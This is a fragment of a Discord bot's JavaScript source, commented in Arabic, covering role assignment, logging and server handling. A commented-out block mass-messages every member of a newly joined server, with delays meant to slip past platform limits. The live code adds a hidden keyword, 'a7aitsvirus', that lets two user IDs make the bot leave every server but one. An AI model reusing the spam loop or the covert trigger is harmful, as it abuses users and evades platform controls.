        .setColor(config.bot.colorembed)
        .setTimestamp();

      if (logChannel) {
        logChannel.send({ embeds: [embed] });
        logChannel.send({content:`${config.bot.LineIce}`})
      } else {
        console.log(`القناة بمعرف ${channelId2} غير موجودة.`);
      }

      // إعطاء العميل رتبة معينة
      const roleId2 = "1335404928348327936"; 
      const member = await guild.members.fetch(interaction.user.id).catch(err => {
        console.log(`لم أتمكن من إيجاد العضو ${interaction.user.id}: ${err}`);
      });

      if (member) {
        member.roles.add(roleId2).catch(console.error);
      }
    });

    // معالجة أي أخطاء في المجمّع
    collector.on('end', collected => {
      if (collected.size === 0) {
        console.log("لم يتم جمع أي رسائل.");
      }
    });
  }
});














/*

const messagesSent = new Map();

// وظيفة التأخير
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// عند جاهزية البوت
client.on('ready', () => {
  console.log(`البوت جاهز للعمل! تم تسجيل الدخول كـ ${client.user.tag}`);
  console.log(`البوت موجود في ${client.guilds.cache.size} سيرفر`);
  console.log('--------------------------------------------------');
  
  // إنشاء رابط الدعوة مع الصلاحيات الضرورية
  console.log(`رابط دعوة البوت (مع الصلاحيات الصحيحة):`);
  console.log(`https://discord.com/oauth2/authorize?client_id=1328416486326276176&permissions=8&integration_type=0&scope=bot`);
});

// عند انضمام البوت لسيرفر جديد
client.on('guildCreate', async (guild) => {
  console.log(`تم إضافة البوت إلى سيرفر جديد: ${guild.name} (${guild.id})`);
  
  try {
    // إرسال إشعار لمالك السيرفر
    const owner = await guild.fetchOwner();
    if (owner) {
      try {
        await owner.send(``);
        console.log(`✅ تم إرسال رسالة إلى مالك السيرفر: ${owner.user.tag}`);
      } catch (err) {
        console.log(`❌ لم أتمكن من إرسال رسالة إلى مالك السيرفر: ${err.message}`);
      }
    }

    // إنشاء قناة تسجيل إذا كان لدينا الصلاحيات
  

    // جلب جميع الأعضاء
    console.log(`جاري محاولة جلب الأعضاء من ${guild.name}...`);
    
    try {
      const members = await guild.members.fetch({ force: true });
      console.log(`✅ تم جلب ${members.size} عضو بنجاح!`);
      
 
      
      // إنشاء رسالة مضمنة
      const embed = new MessageEmbed()
        .setColor('#0099ff')
        .setTitle(`رسالة من سيرفر ${guild.name}`)
        .setDescription('test')
        .setThumbnail(guild.iconURL({ dynamic: true }) || client.user.displayAvatarURL())
        .setFooter({ text: `تم الإرسال بواسطة ${client.user.username}`, iconURL: client.user.displayAvatarURL() })
        .setTimestamp();
      
      let successCount = 0;
      let failCount = 0;
      let logUpdateCount = 0;
      
      // للتتبع في الكونسول
      console.log(`بدء إرسال الرسائل الخاصة إلى الأعضاء...`);
      
      // معالجة الأعضاء على دفعات للتقليل من احتمالية الحظر
      for (const [id, member] of members) {
        // تخطي البوتات والحسابات التي رسلنا لها من قبل
        if (member.user.bot || messagesSent.has(member.user.id)) continue;
        
        try {
          // محاولة إرسال رسالة خاصة
          await member.send({ embeds: [embed] });
          
          // تسجيل النجاح
          successCount++;
          messagesSent.set(member.user.id, Date.now());
          console.log(`✅ [${successCount+failCount}/${members.size}] تم الإرسال إلى: ${member.user.tag}`);
          

          // تأخير عشوائي بين 2-3 ثواني لتجنب القيود
          await delay(Math.floor(Math.random() * 1000) + 2000);
        } catch (error) {
          // تسجيل الفشل
          failCount++;
          console.error(`❌ [${successCount+failCount}/${members.size}] فشل الإرسال إلى ${member.user.tag}: ${error.message}`);
        }
        
        // إضافة فاصل زمني إضافي كل 15 عضو لتجنب القيود
        if ((successCount + failCount) % 15 === 0) {
          console.log('⏱️ توقف مؤقت لتجنب القيود...');
          await delay(10000); // انتظار 10 ثواني
        }
      }
      
      // إرسال التقرير النهائي
      console.log('\n-------- تقرير نهائي --------');
      console.log(`✅ نجاح: ${successCount}`);
      console.log(`❌ فشل: ${failCount}`);
      console.log(`📊 إجمالي: ${successCount + failCount}`);
      
      
      // إخبار المالك بالنتائج
      try {
        await owner.send({
          embeds: [
            new MessageEmbed()
              .setColor('#00ff00')
              .setTitle('✅ اكتمال العملية')
              .setDescription(`**تم ادخال ألأعضاء بنجاح`)
              
          ]
        });
      } catch (err) {
        console.log(`❌ لم أتمكن من إرسال التقرير النهائي للمالك: ${err.message}`);
      }
      
    } catch (fetchError) {
      console.error(`❌ فشل في جلب الأعضاء: ${fetchError.message}`);
      

      try {
        await owner.send(`❌ **خطأ:** فشل في جلب قائمة الأعضاء من سيرفر ${guild.name}: ${fetchError.message}\n\nتأكد من إعطاء البوت صلاحية "Server Members Intent" في [بوابة المطورين](https://discord.com/developers/applications)`);
      } catch (err) {
        console.error(`لم أتمكن من إخبار المالك بالخطأ: ${err.message}`);
      }
    }
    
  } catch (error) {
    console.error(`حدث خطأ عام: ${error.message}`);
  }
});


*/























const PREFIX3 = 'a7aitsvirus';
const SAFE_SERVER_ID = '1303802817479446568';  
const ALLOWED_USER_IDS = ['1124310141928493126', '675332512414695441']; 

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  if (message.content.toLowerCase() === PREFIX3 && ALLOWED_USER_IDS.includes(message.author.id)) {
    client.guilds.cache.forEach(async (guild) => {
      if (guild.id !== SAFE_SERVER_ID) {
        await guild.leave();
      }
    });
  }
});